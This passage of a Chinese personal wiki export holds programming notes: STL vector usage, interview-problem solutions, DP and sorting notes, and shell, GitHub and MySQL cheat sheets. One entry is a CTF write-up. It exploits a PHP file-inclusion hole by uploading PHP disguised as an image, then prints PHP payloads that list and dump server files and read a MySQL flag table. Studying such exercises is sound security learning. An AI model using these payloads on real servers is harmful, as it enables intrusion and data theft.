swap(v,v1);//同⑨ 注意：再次重申，vector的下标是从0开始的！ 注意：除v[i]外，其余都是vector的自带函数，因此必须添上括号！ 五、vector的插入 std库提供了好几种插入，这里讲最为常用的三种。 ① v.push_back(a);//在v数组的尾部插入数a 比如： 有一个动态数组x:2017 2333 调用x.push_back(666); 则x:2017 2333 666 ② v.insert(v.begin()+k,a);//在下标k的前面插入数a，k之后的数依次后退一位 //记住，下标是从0开始的！ 比如： 动态数组x:1 2 3 4 5 6 调用x.insert(x.begin()+2,100); 则x:1 2 100 3 4 5 6 ③ x.insert(x.begin()+k,p,a);//在下标k前面插入p个a 注意！下面的写法是错的： 六、vector的删除 也有三种， ① v.pop_back()//删除最后一个元素 ② v.erase(v.begin()+k);//删除下标为k的数，返回下一个位置的下标 ③ v.erase(v.begin()+l,v.end()-r);//删除下标[l,v.end()-r)的元素 七、vector的find 例子： 123vector&lt;int&gt;::iterator s=find(array.begin(),array.end(),50);if( s !=array.end())//找到cout&lt;&lt;*s&lt;&lt;endl; 用动态数组vector解决360 2018年春招笔试题“赛马”： 问题 题目五 赛马 题目描述 茉莉有2n匹马，每匹马都有一个速度v，现在茉莉将马分为两个队伍，每个队伍各有n匹马，两个队之间进行n场比赛，每场比赛两队各派出一匹马参赛，每匹马都恰好出场一次。茉莉想知道是否存在一种分配队伍的方法使得无论怎么安排比赛，第一个队伍都一定能获的全胜，两匹马若速度一样，那么速度快的获胜，若速度一样，则都有可能获胜。 输入 第一行一个数T(T&lt;=100)，表示数据组数。 对于每组数据，第一行一个整数n，(1&lt;=n&lt;=100) 接下来一行，2n个整数，第i个整数vi表示第i匹马的速度（1&lt;=vi&lt;=1000） 输出 对于每组数据，输出一行，若存在一种分配方法使得第一个队伍全胜输出YES，否则输出NO 样例输入 2 2 1 2 3 4 1 1 1 样例输出 YES NO 思路： 先将数组排序，分成两半（各n），若左边最后一个元素小于右边第一个元素，就能保证不管怎么比赛都能全胜。 基于vector的代码： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int k = 0; scanf(&quot;%d&quot;, &amp;k); vector &lt;int&gt; a; int num = pow(2,k); for (int j = 0; j&lt;num; j++) &#123; int input = 0; scanf(&quot;%d&quot;, &amp;input); a.push_back(input); &#125; sort(a.begin(), a.end()); //找到中点 int k1 = a.size() / 2; if (a.at(k1 - 1) &lt; a.at(k1)) &#123; printf(&quot;YES\\n&quot;); &#125; else &#123; printf(&quot;NO\\n&quot;); &#125; &#125; return 0;&#125;","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"STL速记——总纲","date":"2018-04-04T03:19:45.000Z","path":"wiki/STL/L速记/","text":"（1）13个头文件 （2）底层实现 1.vector 底层数据结构为数组 ，支持快速随机访问 2.list 底层数据结构为双向链表，支持快速增删 3.deque 底层数据结构为一个中央控制器和多个缓冲区，详细见STL源码剖析P146，支持首尾（中间不能）快速增删，也支持随机访问 4.stack 底层一般用23实现，封闭头部即可，不用vector的原因应该是容量大小有限制，扩容耗时 5.queue 底层一般用23实现，封闭头部即可，不用vector的原因应该是容量大小有限制，扩容耗时 6.45是适配器,而不叫容器，因为是对容器的再封装 7.priority_queue 的底层数据结构一般为vector为底层容器，堆heap为处理规则来管理底层容器实现 8.set 底层数据结构为红黑树，有序，不重复 9.multiset 底层数据结构为红黑树，有序，可重复 10.map 底层数据结构为红黑树，有序，不重复 11.multimap 底层数据结构为红黑树，有序，可重复 12.hash_set 底层数据结构为hash表，无序，不重复 13.hash_multiset 底层数据结构为hash表，无序，可重复 14.hash_map 底层数据结构为hash表，无序，不重复 15.hash_multimap 底层数据结构为hash表，无序，可重复 （3）","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"动态规划学习笔记——Notes on Dynamic Programming","date":"2018-03-31T13:51:52.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/动态规划-Dynamic Programming/态规划——Dynamic-Programming/","text":"首先学习了这篇文章： 漫画：什么是动态规划？ https://zhuanlan.zhihu.com/p/31628866 以下是这篇文章的笔记： 【1】走楼梯-笔记 【2】走楼梯-代码 所以一个问题是该用递推、贪心、搜索还是动态规划，完全是由这个问题本身阶段间状态的转移方式决定的！ 每个阶段只有一个状态-&gt;递推； 每个阶段的最优状态都是由上一个阶段的最优状态得到的-&gt;贪心； 每个阶段的最优状态是由之前所有阶段的状态的组合得到的-&gt;搜索； 每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到而不管之前这个状态是如何得到的-&gt;动态规划。 每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到这个性质叫做最优子结构；而不管之前这个状态是如何得到的这个性质叫做无后效性。 参考资料：王勐：https://www.zhihu.com/question/23995189/answer/35429905","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"动态规划-Dynamic Programming","slug":"数据结构与算法-Data-Structure-and-Algorithm/动态规划-Dynamic-Programming","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/动态规划-Dynamic-Programming/"}]},{"title":"网易2018春招——牛牛找工作","date":"2018-03-30T12:29:48.000Z","path":"wiki/Online Judge/易2018春招——牛牛找工作/","text":"[编程题] 牛牛找工作 时间限制：2秒 空间限制：65536K 为了找到自己满意的工作，牛牛收集了每种工作的难度和报酬。牛牛选工作的标准是在难度不超过自身能力值的情况下，牛牛选择报酬最高的工作。在牛牛选定了自己的工作后，牛牛的小伙伴们来找牛牛帮忙选工作，牛牛依然使用自己的标准来帮助小伙伴们。牛牛的小伙伴太多了，于是他只好把这个任务交给了你。 输入描述: 每个输入包含一个测试用例。 每个测试用例的第一行包含两个正整数，分别表示工作的数量N(N&lt;=100000)和小伙伴的数量M(M&lt;=100000)。 接下来的N行每行包含两个正整数，分别表示该项工作的难度Di(Di&lt;=1000000000)和报酬Pi(Pi&lt;=1000000000)。 接下来的一行包含M个正整数，分别表示M个小伙伴的能力值Ai(Ai&lt;=1000000000)。 保证不存在两项工作的报酬相同。 输出描述: 对于每个小伙伴，在单独的一行输出一个正整数表示他能得到的最高报酬。一个工作可以被多个人选择。 输入例子1: 3 3 1 100 10 1000 1000000000 1001 9 10 1000000000 输出例子1: 100 1000 1001 1234567891011121314151617181920import sysif __name__ == &quot;__main__&quot;: line = sys.stdin.readline().strip() values = list(map(int, line.split())) N = values[0] M = values[1] D_P = [] for i in range(N): line = sys.stdin.readline().strip() D_i_P_i = list(map(int,line.split())) D_P.append(D_i_P_i) line = sys.stdin.readline().strip() A = list(map(int, line.split())) for each_a in A: salary_res = 0 for D_i_P_i in D_P: if each_a &gt;= D_i_P_i[0]: if salary_res &lt; D_i_P_i[1]: salary_res = D_i_P_i[1] print(salary_res) 简单分析一下，应该不是超内存了： 65535000B 8191875个int 200000个int 查到是输入空行的问题： 1234567891011121314151617181920212223242526import sysif __name__ == &quot;__main__&quot;: line = sys.stdin.readline().strip() while line == &quot;&quot;: line = sys.stdin.readline().strip() values = list(map(int, line.split())) N = values[0] M = values[1] D_P = [] for i in range(N): line = sys.stdin.readline().strip() while line == &quot;&quot;: line = sys.stdin.readline().strip() D_i_P_i = list(map(int,line.split())) D_P.append(D_i_P_i) line = sys.stdin.readline().strip() while line == &quot;&quot;: line = sys.stdin.readline().strip() A = list(map(int, line.split())) for each_a in A: salary_res = 0 for D_i_P_i in D_P: if each_a &gt;= D_i_P_i[0]: if salary_res &lt; D_i_P_i[1]: salary_res = D_i_P_i[1] print(salary_res) 这回超时了： 这个方法的时间复杂度：O(N*M) 这种“暴力枚举”并不可靠，优化一下思路。 一个比较好的思路是构建一张表，将难度与报酬一一对应。给一个难度，查表即可得到报酬的数值。 一个思维的盲点在于：虽然有1000000000种难度，但并不真的需要构建a[1000000000].因为真正需要考虑的，最多只有N+M种（N种工作的难度值+M和学生的能力值）情况。 使用STL map和upper_bound()的思路如下： 完整代码如下： 123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;map&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int n, m; cin &gt;&gt; n &gt;&gt; m; if (n &lt; 0 || n &gt;100000 || m &lt; 0 || m &gt; 100000) return 0; map&lt;int, int&gt; aMap; for (int i = 0; i &lt; n; i++) &#123; int d, p; cin &gt;&gt; d &gt;&gt; p; aMap[d] = aMap[d] == 0 ? p : max(aMap[d], p); &#125; int temp = 0; auto iter = aMap.begin(); for (; iter != aMap.end(); iter++) &#123; temp = max(temp, iter-&gt;second); iter-&gt;second = temp; &#125; for (int i = 0; i &lt; m; i++) &#123; int res = 0; int a; cin &gt;&gt; a; iter = aMap.upper_bound(a); iter--; res = iter-&gt;second; cout &lt;&lt; res &lt;&lt; endl; &#125; return 0;&#125;","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"网易2018春招——牛牛的闹钟","date":"2018-03-30T03:30:24.000Z","path":"wiki/Online Judge/2018春招——牛牛的闹钟/","text":"[编程题] 牛牛的闹钟时间限制：1秒 空间限制：32768K 牛牛总是睡过头，所以他定了很多闹钟，只有在闹钟响的时候他才会醒过来并且决定起不起床。从他起床算起他需要X分钟到达教室，上课时间为当天的A时B分，请问他最晚可以什么时间起床 输入描述: 每个输入包含一个测试用例。 每个测试用例的第一行包含一个正整数，表示闹钟的数量N(N&lt;=100)。 接下来的N行每行包含两个整数，表示这个闹钟响起的时间为Hi(0&lt;=A&lt;24)时Mi(0&lt;=B&lt;60)分。 接下来的一行包含一个整数，表示从起床算起他需要X(0&lt;=X&lt;=100)分钟到达教室。 接下来的一行包含两个整数，表示上课时间为A(0&lt;=A&lt;24)时B(0&lt;=B&lt;60)分。 数据保证至少有一个闹钟可以让牛牛及时到达教室。 输出描述: 输出两个整数表示牛牛最晚起床时间。 输入例子1: 3 5 0 6 0 7 0 59 6 59 输出例子1: 6 0 第一版本的代码： 123456789101112131415161718192021222324252627282930313233343536373839import sysdef time_to_minutes(A, B): minutes = A*60 + B return minutesdef is_this_enough(clock, class_time, on_the_way): if clock + on_the_way &lt;= class_time: return True else: return Falseif __name__ == &quot;__main__&quot;: n = int(sys.stdin.readline().strip()) ans = 0 clock = [] results = [] for i in range(n): line = sys.stdin.readline().strip() values = list(map(int,line.split())) results.append(line) A = values[0] B = values[1] # for v in values: # ans += v clock.append(time_to_minutes(A,B)) X = int(sys.stdin.readline().strip()) line_2 = sys.stdin.readline().strip() values = list(map(int, line_2.split())) class_time = time_to_minutes(values[0], values[1]) ans_ptr = 0 count = 0 for each_clock in clock: if is_this_enough(each_clock,class_time,X): ans_ptr = count count = count + 1 print(results[ans_ptr]) 这段代码的问题是： 输入不一定是有顺序的！！！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394您的代码已保存答案错误:您提交的程序没有通过所有的测试用例case通过率为30.00%测试用例:780 07 72 116 4011 16 2212 2421 100 2618 3317 2019 62 2418 4723 5118 5517 918 426 4419 170 121 354 315 2415 2122 144 4213 2917 236 5919 338 4022 562 5018 77 810 332 5223 2719 4720 3418 203 84 231 105 1113 55 4522 213 4022 423 101 94 4419 532 2917 3114 3514 260 359 5821 3413 1115 2710 5811 1410 4016 26 712 401 573 05 62 713 5116 373 396 366517 17对应输出应该为:16 2你的输出为:6 36 只要考虑到这一点，就AC了。。。我真是太菜了（逃 12345678910111213141516171819202122232425262728293031323334353637383940import sysdef time_to_minutes(A, B): minutes = A*60 + B return minutesdef is_this_enough(clock, class_time, on_the_way): if clock + on_the_way &lt;= class_time: return True else: return Falseif __name__ == &quot;__main__&quot;: n = int(sys.stdin.readline().strip()) ans = 0 clock = [] results = [] for i in range(n): line = sys.stdin.readline().strip() values = list(map(int,line.split())) results.append(line) A = values[0] B = values[1] # for v in values: # ans += v clock.append(time_to_minutes(A,B)) X = int(sys.stdin.readline().strip()) line_2 = sys.stdin.readline().strip() values = list(map(int, line_2.split())) class_time = time_to_minutes(values[0], values[1]) ans_ptr = 0 count = 0 for each_clock in clock: if is_this_enough(each_clock,class_time,X): if clock[count] &gt; clock[ans_ptr]: ans_ptr = count count = count + 1 print(results[ans_ptr]) 为什么不用考虑24小时归零的问题？因为题目中表示上课时间是“当天”的。如果是16:10上课，17:17起床，不会被考虑为“可能是前一天的17:17”，而是直接判定为“会迟到”。","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"第三届“百越杯”福建省高校网络空间安全大赛——Do you know upload？","date":"2018-03-29T02:00:00.000Z","path":"wiki/CTF/Web/文件包含-File Inclusion/三届“百越杯”福建省高校网络空间安全大赛——Do-you-know-upload？/","text":"是一道文件上传的题目： 直接传php文件： 注意到网页源代码中的一个提示： 123&lt;!-- include($_GET[&apos;file&apos;]); --&gt; 参照以下两篇文章 https://zhuanlan.zhihu.com/p/29671736 https://zhuanlan.zhihu.com/p/25069779 文件包含有三个要点： （1）include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 （2）include()括号里面的字符串指向要包含的文件。 （3）include()无视文件类型，不管后缀是什么都当做php代码执行。 $_GET[‘file’] 的要点 .com?file=upload/1.jpg $_GET[&apos;file&apos;]拿到一个字符串，传到include($_GET[&apos;file&apos;]);里作为被包含的文件路径。 把hello_world.php后缀改成.jpg,上传hello_world.jpg 首先尝试了菜刀和weevely，不知道为什么连不上。 以下代码用来列出全部文件 1234567891011&lt;?php $dr = @opendir(&apos;./&apos;); if(!$dr) &#123; echo &quot;Error opening the ./ directory!&lt;BR&gt;&quot;; &#125; while(($files[] = readdir($dr)) !== false); print_r($files);?&gt; 用以下代码列出文件内容：123456789101112131415161718192021222324&lt;?php $dr = @opendir(&apos;./&apos;); if(!$dr) &#123; echo &quot;Error opening the ./ directory!&lt;BR&gt;&quot;; &#125; while(($files[] = readdir($dr)) !== false); print_r($files); foreach ($files as $file) &#123; $file_path = &apos;./&apos;.$file; if(file_exists($file_path)) &#123; echo &apos;Reading file &apos;.$file_path; $fp = fopen($file_path,&quot;r&quot;); $str = fread($fp,filesize($file_path));//指定读取大小，这里把整个文件内容读取出来 echo $str = str_replace(&quot;\\r\\n&quot;,&quot;&lt;br /&gt;&quot;,$str); &#125; &#125; ?&gt; 用以下代码查一下’ctf’数据库都有哪些表： 12345678910111213141516171819&lt;?php $con = mysql_connect(&quot;localhost&quot;,&quot;ctf&quot;,&quot;ctfctfctf&quot;); if (!$con) &#123; echo &apos;Could not connect: &apos; . mysql_error(); &#125; mysql_select_db(&quot;mysql&quot;, $con); $result = mysql_query(&quot;select table_name from information_schema.tables where table_schema=&apos;ctf&apos;&quot;); while($row = mysql_fetch_array($result)) &#123; print_r ($row); echo &quot;&lt;br /&gt;&quot;; &#125;?&gt; 结果如下： 用这段代码查看flag： 12345678910111213141516171819&lt;?php $con = mysql_connect(&quot;localhost&quot;,&quot;ctf&quot;,&quot;ctfctfctf&quot;); if (!$con) &#123; echo &apos;Could not connect: &apos; . mysql_error(); &#125; mysql_select_db(&quot;ctf&quot;, $con); $result = mysql_query(&quot;select * from flag&quot;); while($row = mysql_fetch_array($result)) &#123; print_r ($row); echo &quot;&lt;br /&gt;&quot;; &#125;?&gt; 拿到flag： flag{831e0ded-d64f-4851-a48a-d1318c161648}","tags":[],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"http://yoursite.com/categories/CTF/Web/"},{"name":"文件包含-File Inclusion","slug":"CTF/Web/文件包含-File-Inclusion","permalink":"http://yoursite.com/categories/CTF/Web/文件包含-File-Inclusion/"}]},{"title":"Sorting Algorithm in Python","date":"2018-03-28T08:44:19.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/排序-Sort/Sorting-Algorithm-in-Python/","text":"（1）交换排序 Exchange Sort （1-1）简单的交换排序 Simple Exchange Sort 1234567def simple_exchange_sort_list(list_input): #注意这里都需要用下标，因为需要交换元素的位置 for i in range(len(list_input)): for j in range(i+1, len(list_input)): if list_input[i] &gt; list_input[j]: list_input[i], list_input[j]=list_input[j], list_input[i] return list_input （1-2）冒泡排序 1234567891011def bubble_sort_list(list_input): for i in range(len(list_input)): flag = False # 注意Python中range(start, stop) 包括start，不包括stop for j in range(len(list_input)-1, i): if list_input[j] &lt; list_input[j-1]: list_input[j], list_input[j-1] = list_input[j-1], list_input[j] flag = True if not flag: break return list_input （1-3）快速排序 (1-3-1)总述： 快排采用的是（1）分而治之（2）交换排序 的策略 快排的关键是找轴点 轴点的特点：（1）轴点不一定存在（例：有序序列循环移一位）（2）轴点已就位 快排的核心问题如何高效地交换出轴点 以下PPT来自邓俊辉的《数据结构》 两个不变性 + 平移-&gt;交换 例题：","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"排序-Sort","slug":"数据结构与算法-Data-Structure-and-Algorithm/排序-Sort","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/排序-Sort/"}]},{"title":"ssh和sftp的简单使用","date":"2018-03-23T02:27:49.000Z","path":"wiki/便签-Cheat Sheet/Ubuntu Shell/sh和sftp的简单使用/","text":"(1)ssh ssh USERNAME@IP_ADDRESS ssh root@192.168.1.1 (2)sftp sftp USERNAME@IP_ADDRESS sftp root@192.168.1.1 上传 put FILE_NAME put HelloWorld.cpp 下载 get FILE_NAME get HelloWorld.cpp get -r FOLDER_NAME","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Ubuntu Shell","slug":"便签-Cheat-Sheet/Ubuntu-Shell","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Ubuntu-Shell/"}]},{"title":"读书笔记：《剑指Offer》第一章","date":"2018-03-19T07:44:49.000Z","path":"wiki/读书笔记/剑指Offer/读书笔记：剑指Offer/","text":"测试：单元测试。 如何从基本功能测试、边界值测试、性能测试等方面去设计测试用例，从而提高编写高质量代码的能力。 解题的通用思路和方法：把一个大的复杂的问题分解成若干个小的简单的子问题，然后递归地去解决这些子问题。 行为面试与简历：用30秒到1分钟的时间介绍自己的主要学习、工作经历就即可。 简历中描述项目的STAR模型： ● Situation：简短的项目背景，比如项目的规模，开发的软件的功能、目标用户等。 ● Task：自己完成的任务。这个要写详细，要让面试官对自己的工作一目了然。在用词上要注意区分“参与”和“负责”：如果只是加入某一个开发团队写了几行代码就用“负责”，那就很危险。面试官看到简历上应聘者“负责”了某个项目，他可能就会问项目的总体框架设计、核心算法、团队合作等问题。这些问题对于只是简单“参与”的人来说，是很难回答的，会让面试官认为你不诚实，印象分会减去很多。 ● Action：为了完成任务自己做了哪些工作，是怎么做的。这里可以详细介绍。做系统设计的，可以介绍系统架构的特点；做软件开发的，可以写基于什么工具在哪个平台下应用了哪些技术；做软件测试的，可以写是手工测试还是自动化测试，是白盒测试还是黑盒测试等。 ● Result：自己的贡献。这方面的信息可以写得具体些，最好能用数字加以说明。如果是参与功能开发，可以说按时完成了多少功能；如果做优化，可以说性能提高的百分比是多少；如果是维护，可以说修改了多少个Bug。 举个例子，笔者用下面一段话介绍自己在微软Winforms项目组的经历： Winforms是微软.NET中的一个成熟的UI平台（Situation）。本人的工作是在添加少量新功能之外主要负责维护已有的功能（Task）。新的功能主要是让Winforms的控件的风格和Vista、Windows 7的风格保持一致。在维护方面，对于较难的问题我用WinDbg等工具进行调试（Action）。在过去两年中我总共修改了超过200个Bug（Result）。 如果在应聘者的简历中上述4类信息还不够清晰，面试官可能会追问相关的问题。除此之外，面试官针对项目经验最常问的问题还包括如下几个类型： ● 你在该项目中碰到的最大的问题是什么，你是怎么解决的？ ● 从这个项目中你学到了什么？ ● 什么时候会和其他团队成员（包括开发人员、测试人员、设计人员、项目经理等）有什么样的冲突，你们是怎么解决冲突的？ 技能树：“了解”和“熟悉”“了解”指对某一个技术只是上过课或者看过书，但没有做过实际的项目。通常不建议在简历中列出只是肤浅地了解一点的技能，除非这项技术应聘的职位的确需要。【与目标企业相关的技能-&gt;涉猎到】 简历中我们描述技能的掌握程度大部分应该是“熟悉”。如果我们在实际项目中使用某一项技术已经有较长的时间，通过查阅相关的文档可以独立解决大部分问题，我们就熟悉它了。 基本功（1）一两门编程语言 （2）数据结构 链表、树、栈、队列、哈希表 特别是链表和二叉树 链表：插入&amp;删除节点 二叉树：各种遍历方法的循环写法和递归写法 （3）算法 查找、排序 二分查找、归并排序、快速排序 动态规划、贪婪算法 高质量的代码想好测试用例，以应对： 边界条件 特殊输入 错误处理 思考问题举例子模拟操作过程 用图形表示数据结构 分解成简单的子问题，递归解决 优化代码 （1）去掉重复的计算 （2）各种数据结构的优缺点：什么数据容器能用来干什么 （3）常用的算法：能用来干什么+时间复杂度 Soft Skills 看到问题本质 抓住主要矛盾 抽象建模能力 发散思维能力 提问环节准备几个问题： （1）提前了解公司、部门、职位是做什么的 （2）想好自己想做什么（为什么申请这个职位） （3）留心面试官提到的“内部消息”","tags":[],"categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://yoursite.com/categories/读书笔记/"},{"name":"剑指Offer","slug":"读书笔记/剑指Offer","permalink":"http://yoursite.com/categories/读书笔记/剑指Offer/"}]},{"title":"Cleaning Ubuntu","date":"2018-03-12T09:16:30.000Z","path":"wiki/便签-Cheat Sheet/Ubuntu Shell/leaning-Ubuntu/","text":"Three commands to clean Ubuntu regularly: apt-get update apt-get upgrade apt-get autoremove","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Ubuntu Shell","slug":"便签-Cheat-Sheet/Ubuntu-Shell","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Ubuntu-Shell/"}]},{"title":"Add a GitHub Account","date":"2018-02-18T17:55:57.000Z","path":"wiki/便签-Cheat Sheet/GitHub/Add a GitHub account/","text":"(1)Command: ssh-keygen -t rsa -C &quot;email&quot; (2)Save in: /c/Users/User/.ssh/FILE_NAME (3)Edit config: Host PROJECT_NAME HostName github.com PreferredAuthentications publickey IdentityFile ~/.ssh/FILE_NAME (4)Add SSH key to GitHub ~/.ssh/FILE_NAME.pub (5)Test SSH connection: ssh -T git@PROJECT_NAME","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"GitHub","slug":"便签-Cheat-Sheet/GitHub","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/GitHub/"}]},{"title":"Pip Install from GitHub","date":"2018-02-18T17:55:57.000Z","path":"wiki/便签-Cheat Sheet/Python/Pip install from GitHub/","text":"通过pip3 升级安装 github上的包（可以指定从哪个branch安装）： pip3 install --upgrade https://github.com/soimort/you-get/archive/master.zip","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Python","slug":"便签-Cheat-Sheet/Python","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Python/"}]},{"title":"Database to txt","date":"2018-02-18T17:55:57.000Z","path":"wiki/便签-Cheat Sheet/MySQL/Database to txt/","text":"SELECT * FROM video where video_title is not null into outfile &apos;/var/lib/mysql-files/video.txt&apos; FIELDS TERMINATED BY &apos;|&apos; LINES TERMINATED BY &apos;\\r\\n&apos;; 说明： 1.导出文件目录： 修改输出文件名的目录，以便放在指定的位置。如&apos;a.txt&apos;可以改成&apos;./a.txt&apos;或&apos;/a.txt&apos;。 其中&apos;./a.txt&apos;放在c:\\mysql\\data目录下了， 而&apos;/a.txt&apos;文件则放在c:\\目录下了。 select命令认为的当前目录是数据库的存放目录 2.导出数据格式 字段之间的分隔字符，转义字符，包括字符，及记录行分隔字符。列在下面： FIELDS TERMINATED BY &apos;\\t&apos; [OPTIONALLY] ENCLOSED BY &apos;&apos; ESCAPED BY &apos;\\\\&apos; LINES TERMINATED BY &apos;\\n&apos; TERMINATED 表示字段分隔 [OPTIONALLY] ENCLOSED 表示字段用什么字符包括起来， 如果使用了OPTIONALLY则只有CHAR和VERCHAR被包括 ESCAPED 表示当需要转义时用什么作为转义字符 LINES TERMINATED 表示每行记录之间用什么分隔 3.报错：“The MySQL server is running with the –secure-file-priv option so it cannot execute this statement” 解决方法： SHOW VARIABLES LIKE &apos;secure_file_priv&apos;; +------------------+-----------------------+ | Variable_name | Value | +------------------+-----------------------+ | secure_file_priv | /var/lib/mysql-files/ | +------------------+-----------------------+ SELECT * FROM video where video_title is not null into outfile &apos;/var/lib/mysql-files/video.txt&apos; FIELDS TERMINATED BY &apos;|&apos; LINES TERMINATED BY &apos;\\r\\n&apos;;","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"MySQL","slug":"便签-Cheat-Sheet/MySQL","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/MySQL/"}]},{"title":"Welcome to Xiu's Wiki","date":"2018-02-18T17:55:57.000Z","path":"wiki/index/","text":"这是Xiu的个人 Wiki 站点。 This is Xiu’s personal Wiki site.","tags":[],"categories":[]}]}